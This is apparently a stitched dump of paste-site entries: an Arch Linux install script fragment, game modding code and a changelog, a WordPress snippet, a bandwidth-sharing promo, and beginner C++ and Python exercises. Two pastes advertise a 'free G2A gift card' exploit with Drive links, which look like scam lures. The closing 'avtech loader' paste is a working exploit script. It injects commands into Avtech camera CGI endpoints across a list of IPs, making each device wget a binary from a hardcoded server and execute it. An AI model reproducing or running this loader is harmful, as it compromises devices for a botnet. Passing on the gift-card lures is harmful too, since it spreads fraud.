arch-chroot /mnt /bin/bash -c ""pacman -S cryptsetup --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S lvm2 --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S logrotate --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S nano --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S hddtemp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S unzip --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S zip --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dnsmasq --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ethtool --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ndisc6 --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S inetutils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wvdial --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S gptfdisk --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhcp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhcpcd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhclient --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ppp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S netctl --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S networkmanager --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S iwd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S net-tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ifplugd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dialog --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S neofetch --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S git --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wget --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S lsb-release --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S accountsservice --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S bash-completion --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S less --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ntp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S usb_modeswitch --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S usbctl --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S usbutils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S which --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S mtools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dosfstools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S exfatprogs --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ntfs-3g  --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S reiserfsprogs --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S btrfs-progs --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""pacman -S bridge-utils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S sof-firmware --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S firewalld --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S sof-tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S tlp --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""systemctl enable dhcpcd NetworkManager""

  ;;

  linux-lts)

arch-chroot /mnt /bin/bash -c ""pacman -Syu --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -Syu --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -Sy alsi --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -Sy yay-bin --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""pacman -S linux-lts --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S linux-lts-headers --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S linux-firmware --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S mkinitcpio --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S pacman-mirrorlist --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S cryptsetup --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S lvm2 --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S logrotate --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S nano --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S hddtemp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S unzip --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S zip --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dnsmasq --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ethtool --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ndisc6 --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S inetutils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wvdial --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S gptfdisk --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhcp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhcpcd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhclient --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ppp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S netctl --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S networkmanager --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S iwd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S net-tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ifplugd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dialog --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S neofetch --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S git --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wget --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S lsb-release --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S accountsservice --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S bash-completion --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S less --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ntp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S usb_modeswitch --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S usbutils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S which --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S mtools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dosfstools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S exfatprogs --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ntfs-3g  --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S reiserfsprogs --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S btrfs-progs --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""pacman -S bridge-utils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S sof-firmware --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S firewalld --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S sof-tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S tlp --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""systemctl enable dhcpcd NetworkManager""

  ;;

  linux-zen)

arch-chroot /mnt /bin/bash -c ""pacman -Syu --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -Syu --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -Sy alsi --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -Sy yay-bin --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""pacman -S linux-zen --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S linux-zen-headers --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S linux-firmware --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S mkinitcpio --noconfirm""
arch-chroot /mnt /bin/bash -c ""pacman -S pacman-mirrorlist --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S cryptsetup --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S lvm2 --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S logrotate --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S nano --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S hddtemp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S unzip --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S zip --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dnsmasq --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ethtool --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ndisc6 --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S inetutils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wvdial --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S gptfdisk --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhcp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhcpcd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dhclient --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ppp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S netctl --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S networkmanager --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S iwd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S net-tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ifplugd --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dialog --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S neofetch --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S git --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wget --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S lsb-release --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S accountsservice --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S bash-completion --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S less --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ntp --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S usb_modeswitch --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S usbutils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S which --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S mtools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dosfstools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S exfatprogs --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S ntfs-3g  --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S reiserfsprogs --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S btrfs-progs --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""pacman -S bridge-utils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S sof-firmware --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S firewalld --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S sof-tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S tlp --noconfirm --needed""

arch-chroot /mnt /bin/bash -c ""systemctl enable dhcpcd NetworkManager""

  ;;

esac



if [ ""$selec8168"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""pacman -S r8168 --noconfirm""
echo blacklist r8169 > /mnt/etc/modprobe.d/blacklist.conf
cat /mnt/etc/modprobe.d/blacklist.conf
arch-chroot /mnt /bin/bash -c 'modprobe r8168'
fi

if [ ""$selec8168lts"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""pacman -S r8168-lts --noconfirm""
echo blacklist r8169 > /mnt/etc/modprobe.d/blacklist.conf
cat /mnt/etc/modprobe.d/blacklist.conf
arch-chroot /mnt /bin/bash -c 'modprobe r8168'
fi


if [ ""$microdriver"" == ""true"" ]; then
microcode=$(lspci -k | grep 'Host bridge: Intel')
lspci -k | grep 'Host bridge:'  > procesador
if [[ $microcode  = *Intel* || $microcode = *intel* || $microcode = *INTEL* ]]
then
clear    
echo """"
echo """"
echo """"
cat procesador
echo """"   
sleep 3
arch-chroot /mnt /bin/bash -c ""pacman -S intel-ucode --noconfirm""
else
clear
echo """"
echo """"     
cat procesador
echo """"  
sleep 3
arch-chroot /mnt /bin/bash -c ""pacman -S amd-ucode --noconfirm""
fi
fi


if [ ""$wifidriver"" == ""true"" ]; then
broadcom=$(/bin/bash -c ""lspci -k | grep 'Network controller: Broadcom' "")
if [[ $broadcom  = *Broadcom* || $broadcom = *broadcom* || $broadcom = *BROADCOM* ]]
then            
arch-chroot /mnt /bin/bash -c ""pacman -S broadcom-wl --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wireless-regdb --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wpa_supplicant --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wireless_tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c 'modprobe wl' 
arch-chroot /mnt /bin/bash -c 'rmmod b43'
arch-chroot /mnt /bin/bash -c 'rmmod ssb' 
else  
arch-chroot /mnt /bin/bash -c ""pacman -S iw --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wireless_tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wpa_supplicant --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dialog --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wireless-regdb --noconfirm --needed""
fi
fi

if [ ""$wifidriverdmks"" == ""true"" ]; then
broadcom=$(arch-chroot /mnt /bin/bash -c ""lspci -k | grep 'Network controller: Broadcom' "")
if [[ $broadcom  = *Broadcom* || $broadcom = *broadcom* || $broadcom = *BROADCOM* ]]
then      
arch-chroot /mnt /bin/bash -c ""pacman -S broadcom-wl-dkms --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wireless-regdb --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wpa_supplicant --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wireless_tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c 'modprobe wl' 
arch-chroot /mnt /bin/bash -c 'rmmod b43'
arch-chroot /mnt /bin/bash -c 'rmmod ssb' 
else
arch-chroot /mnt /bin/bash -c ""pacman -S iw --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wireless_tools --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wpa_supplicant --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S dialog --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S wireless-regdb --noconfirm --needed""
fi
fi

if [ ""$touchdriver"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""pacman -S xf86-input-synaptics --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S xf86-input-libinput --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S xorg-xinput --noconfirm --needed""
fi

if [ ""$blutudriver"" == ""true"" ]; then
arch-chroot /mnt /bin/bash -c ""pacman -S bluez --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S bluez-utils --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""pacman -S pulseaudio-bluetooth --noconfirm --needed""
arch-chroot /mnt /bin/bash -c ""systemctl enable bluetooth.service""
fi





}
"
qehNiSzC,stop hit (no armor) attacker + victim,ronglucky583,C++,Friday 10th of May 2024 12:53:35 PM CDT,"else if(info->m_MessageId == GE_SosStartSoundEvent)
	{
		CMsgSosStartSoundEvent* msg = (CMsgSosStartSoundEvent*)pData;

		/*if (msg->soundevent_hash() != -527125825 && msg->soundevent_hash() != 62938228)
		{
			Message(""CMsgSosStartSoundEvent: soundevent_guid:%d --- soundevent_hash:%d --- start_time:%f\n"", msg->soundevent_guid(), 
				msg->soundevent_hash(), msg->start_time());
		}*/

		if (msg->soundevent_hash() == 62938228 || msg->soundevent_hash() == -527125825) // Attacker headshot / body shot sound call back.
			*(uint64*)clients &= ~g_playerManager->GetStopSoundMask();
		
		if (msg->soundevent_hash() == 2019962436 || msg->soundevent_hash() == -2010269021) // victim headshot shot sound call back.
			*(uint64*)clients &= ~g_playerManager->GetStopSoundMask();
		
		if (msg->soundevent_hash() == -1847647044 || msg->soundevent_hash() == 856190898) // victim body shot sound call back.
			*(uint64*)clients &= ~g_playerManager->GetStopSoundMask();
	}"
kDPr9B2U,BWR - Changelog 09/05/24,SSilver,Diff,Friday 10th of May 2024 12:42:36 PM CDT,"Fixes
+ Medeival allows all bread items
+ Bison & Pomson boosted projectile speed
+ Iron Bomber fixed blast on rollers
- Milk & Jarate no longer refill on resupply
- Danger Shield & Spy-Cicle don't instantly cancel debuffs
Fixes to improve consistency of weapon changes.

Cow Mangler 3000
+ Increased damage to cause misfire to 40 (was 10)
- Damage to cause misfire counts cumulatively
The former damage limit was too low and made charging excessively risky. This increase should make single stronger hits still strong enough to cancel it in close range, but makes chip damage at in mid range less likely to cause it unless consecutive hits are made. Snipers, revolvers, and similar sources should be able to check this at longer ranges.

Airblast
+ Reduced pressure cooldown to 5 seconds (was 8s)
- Increased pressure cost per airblast to 100%
Feedback had shown Pyro has become too mobile with how active his airblast can recharge, even with the prior nerf, for how little spaced out airblasts took up your charge. This change should make airblast jumps less spammable and force the pyro to make more intentional choices on when he airblasts to extinguish or reflect in a fight, or to keep his pocket mobility boost.

Phlogistinator
+ Removed crits become minicrits
+ Removed slower alt-fire rate
~ Crit damage scale with temperature, from +35% at min and +100% at max
- Increased alt-fire self-knockback to -100% (was -33%)
- Removed lingering flame bonus
The ability to close the gap with the boosted damage made it rather extreme in how little room players had to escape it. However simply nerfing this mobility would make the boosted damage be a little too underwhelming. Rather than simply increasing this damage, it was instead made to ramp up with temperature from consecutive hits, requiring more accuracy to actually drive up the damage and give more nuance to how the pyro picks targets to melt with his MMMPH.

Detonator
- Reduced afterburn duration on splash by 33% (7.5s->5s)
Scorch Shot
+ Flares explode on surfaces just after fire
- Reduced afterburn duration on splash by 33% (7.5s->5s)
Ranged sources of afterburn proved to be a bit too spammable, so these were de-emphasized save for with direct hits to make their crowd control less opressive. Providing supplemental mobility should keep these items relevant, as Scorch Shot is additionally given ability to more consistently perform jumps.

Neon Annihilator
+ While intact, weapon deals +150% damage on next hit
+ Reduced charge to only 100 damage (was 250)
- Afterburn damage counts at 50% for charge
- Only charges while active
- Removed explosion while intact
The caber version of this weapon was a little too polarizing, in particular for the boosted range. It's reined in with charge now providing a single-target damage boost and needing active usage to charge. The reduced charge amount and it's range should help make gaining the charge not too difficult, basically taking 2 hits to fully charge and allowing you to pocket the 3rd stronger hit.

Buffalo Steak Sandvich
+ Heals 100 HP on eating
+ Recharges with damage dealt, up to 600 to refill
+ On-Kill during effects: heal +50 HP and increase duration by 2 seconds
+ Removed extra 3 seconds Mark for Death on effect's end
- Removed damage resistance
- Starts empty from spawn
- No longer recharges through healthpacks and with time
- Duration reduced to 12 seconds (was 20)
These changes were coaleced from a great deal of feedback and experience to better fill an intended niche. Firstly, healing on use and on-kill under effects replaces resistance to give Heavy the sustainability and opportunity to use the buff less passively. The duration extending on-kill similarly helps, with a reduced starting duration to make sure the Heavy is no longer shackled to it before cancelling. However, without a passive recharge and coming from spawn, it ought to be seen as more valuable when you have it. The intent with these changes is to provide Heavy an option to help his team push when pushing forward, providing some quick pressure with his speed, damage, and sustainability if he can get the melee kills in.

Warrior's Spirit
+ Removed deploy penalty
Feedback proved that being forded into a slow deploy when using the item with anything but the Steak drastically reduced it's useability, and was counterproductive.

The Razorback
+ Critical Hits count for 100 damage absorbed limit, not instantly breaking shield
A little fix to better improve it's performance versus smaller crits, particularly from repeat fire weapons."
g2n3388X,Como Deshabilitar la API REST de WordPress con PHP,NubeColectiva,PHP,Friday 10th of May 2024 12:26:21 PM CDT,"/* Deshabilitar API REST en WordPress */ 
/* Colócalo en el archivo functions.php de tu Tema */

add_filter('rest_authentication_errors', function($resultados) {
    if (true === $resultados || is_wp_error($resultados)) {
        return $resultados;
    }

    if (! is_user_logged_in()) {
        return new WP_Error(
            'mi_codigo',
            __( 'No tienes permiso para ver esto.' ),
            array( 'status' => 401 )
        );
    }

    return $resultados;
});"
PQXhn7Lm,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Friday 10th of May 2024 12:13:46 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_271625.pdf

Working as of:
10 May 2024"
FTYCy7NP,How Can You Earn Money by Sharing Your Internet Is ByteLixir a Scam or Legit,livebetpro,PHP,Friday 10th of May 2024 12:09:56 PM CDT,"https://www.livebetpro.com/how-can-you-earn-money-by-sharing-your-internet-is-bytelixir-a-scam-or-legit/
 Table of Contents : ByteLixir

 	Getting Started with ByteLixir: Simple Steps to Earn Money
 	Unlocking the Benefits of ByteLixir
 	Important Considerations When Using ByteLixir
 	Exploring ByteLixir Further
 	Final Thoughts on ByteLixir

Getting Started with ByteLixir: Simple Steps to Earn Money
ByteLixir is designed for ease of use, enabling users to start earning passive income with just a few steps:
Step 1: Create a Free ByteLixir Account
Visit the ByteLixir website or download the ByteLixir mobile app from the Google Play Store to sign up for a free account.
Step 2: Download the ByteLixir App
Install the app on your computer, laptop, or Android phone to enable seamless sharing of bandwidth.
Step 3: Run ByteLixir in the Background
Once installed, allow the app to operate in the background to share your unused internet bandwidth.
Step 4: Earn Money by Sharing Bandwidth
ByteLixir states that users can earn $1 for every 1 GB of data shared. When you reach the minimum payout threshold (usually $2), you can request a cash-out through various methods.
Step 5: Maximize Earnings with Multiple Devices
By installing the app on multiple devices, you can increase your earnings by sharing bandwidth from each device.
Unlocking the Benefits of ByteLixir
Using ByteLixir can be advantageous for those seeking to earn extra income. Here are some of the key benefits:
Benefit 1: Passive Income
ByteLixir allows you to earn money without active effort, providing a stream of income while you carry on with your regular activities.
Benefit 2: Simple Setup
The platform is designed for user convenience, requiring minimal effort to get started.
Benefit 3: Multiple Device Compatibility
The ByteLixir app can be installed on a range of devices, maximizing your earning potential.
Important Considerations When Using ByteLixir
Before using ByteLixir, consider the following factors to ensure a positive experience:
Consideration 1: Privacy and Security
Ensure that ByteLixir has robust security measures in place. Review their privacy policy to understand how they handle data.
Consideration 2: Internet Provider Rules
Some internet service providers (ISPs) have rules regarding bandwidth sharing. Make sure that your ISP permits it.
Consideration 3: Impact on Connection Speed
Sharing bandwidth could affect your internet speed. Test ByteLixir on one device before expanding to others.
Consideration 4: Reputation and Reliability
Check reviews and feedback from other users to gauge ByteLixir's reputation. This helps ensure you're dealing with a trustworthy platform.
Exploring ByteLixir Further
To learn more about ByteLixir and determine if it's right for you, here are some helpful resources:
ByteLixir Official Website
Visit the ByteLixir website for additional information and updates.
ByteLixir Mobile App
Download the ByteLixir app from the Google Play Store to experience it firsthand.
Community Forums and Reviews
Look for community forums or reviews to gather insights from other users' experiences.
Final Thoughts on ByteLixir
ByteLixir offers a unique way to earn passive income by sharing your unused internet bandwidth. However, it's crucial to conduct thorough research and ensure it aligns with your privacy, security, and internet service provider's policies. If used wisely, ByteLixir can be a valuable tool for generating extra income. Remember to stay informed about any changes or updates to the platform for a safe and enjoyable experience."
yMbWV0B3,6 (с третьим параметром),nq1s788,Python,Friday 10th of May 2024 12:05:42 PM CDT,"#https://inf-oge.sdamgia.ru/problem?id=16014
a = [(1, 2), (11,2), (1,12), (11,12), (-11,-12), (-11,12), (-12,11), (10,10), (10,5)]
for A in range(-1000, 1000):
    cnt = 0 #сколько раз встретилось NO для этого A
    for e in a:
        s = e[0]
        t = e[1]
        if (s > 10) or (t > A):
            cnt += 0
        else:
            cnt += 1
    if cnt == 3:
        print(A) #сколько вывелось, такой и ответ"
4AgRme4D,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Friday 10th of May 2024 11:51:33 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
10 May 2024"
T7FXMcj4,Untitled,MeehoweCK,C++,Friday 10th of May 2024 11:27:35 AM CDT,"#include <iostream>

const int ROZMIAR{ 15 };

void wypelnijTablice(int* tab) {		// tablice jednowymiarowe przekazujemy do funkcji w argumencie jako [typ_zmiennej]* (z gwiazdką)
	for (auto i{ 0 }; i < ROZMIAR; ++i) {
		tab[i] = i;
	}
}

// UWAGA: tablice są przekazywane do funkcji przez referencję (przekazywany jest faktyczny obiekt, a nie tylko jego wartość)
void podwojWartosciTablicy(int* tab) {
	for (auto i{ 0 }; i < ROZMIAR; ++i) {
		tab[i] *= 2;
	}
}

void podwojWartosc(int liczba) {		// tutaj tworzona jest zmienna lokalna (!) o nazwie liczba, pobiera ona taką wartość jaką podaliśmy przy wywołaniu funkcji
	liczba *= 2;						// zmienna lokalna zwiększa swoją wartość dwukrotnie
	std::cout << liczba << std::endl;	// wypisujemy wartość zmiennej lokalnej utworzonej wewnątrz tej funkcji (jej wartość jest 2x większa niż wartość przekazana do funkcji)
}										// zmienna lokalna jest niszczona

void wypiszTablice(int* tab) {
	for (auto i{ 0 }; i < ROZMIAR; ++i) {
		std::cout << tab[i] << '\t';
	}
	std::cout << std::endl;
}

int main() {
	int tablica[ROZMIAR];		// deklaracja tablicy bez inicjalizacji
	wypelnijTablice(tablica);

	wypiszTablice(tablica);

	podwojWartosciTablicy(tablica);

	// wypisanie na ekran tablicy z podwojonymi wartościami:
	wypiszTablice(tablica);

	auto liczba{ 8 };
	std::cout << liczba << std::endl;		// wypisujemy na ekran wartość zmiennej liczba (8)
	podwojWartosc(liczba);					// wywołujemy funkcję dla wartości równej 8 (aktualna wartość zmiennej liczba)
	std::cout << liczba << std::endl;		// wypisujemy na ekran wartość zmiennej liczba (ta sama, która była przed wywołaniem funkcji, bo funkcja korzystała z jej wartości, a nie samej zmiennej)

	return 0;
}"
Wmua6F2N,avtech loader,D3adG,Python,Friday 10th of May 2024 11:14:42 AM CDT,"#   Avtech loader - #

import sys, time, requests
from threading import Thread
import random

num = 1
host_server = ""159.203.138.107""
ips = open(sys.argv[1], ""r"").readlines()
filename = random.randint(1, 100) 
filename = str(filename) 
payload = ""cd%20/tmp;%20wget%20http://""+host_server+""/binarizz/arm5%20-O%20""+filename+"".arm5;%20chmod%20777%20""+filename+"".arm5;%20./""+filename+"".arm5%20avtech""
def avtech(num, ip, port):
    port = int(port)
    host = '%s:%d' % (ip, port)
    url = ""http://""+host+""/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(""+payload+"")&password=admin""
    try:
        headers = {
            ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"",
            ""Accept-Encoding"": ""gzip, deflate, sdch"",
            ""Accept-Language"": ""en-US,en;q=0.8"",
            ""Cache-Control"": ""max-age=0"",
            ""Connection"": ""keep-alive"",
            ""Host"": ip,
            ""Upgrade-Insecure-Requests"": ""1"",
            ""User-Agent"": ""Snickers-Avtech""
        }
        r1 = requests.get(url, headers=headers)
        time.sleep(1)
        resp = r1.text
        if ""ok"" in resp.lower():
            print (""(%d) Sent payload[1]"" % (num))
        else:
            url1 = ""http://""+host+""/nobody/ez.htm?a=YWRtaW46YWRtaW4=&rnd=0.06814667194551349""
            url2 = ""http://""+host+""/cgi-bin/supervisor/CloudSetup.cgi?exefile=""+payload+"";%20echo%20urmum_was_here""
            r2 = requests.get(url1, headers=headers)
            time.sleep(0.5)
            r3 = requests.get(url2, headers=headers)
            time.sleep(1)
            resp = r3.text
            if ""snickers_was_here"" in resp.lower():
                print (""(%d) Sent payload[2]"" % (num))
            else:
                print( ""(%d) Failed to send both payloads..."" % (num))
    except:
        pass
      
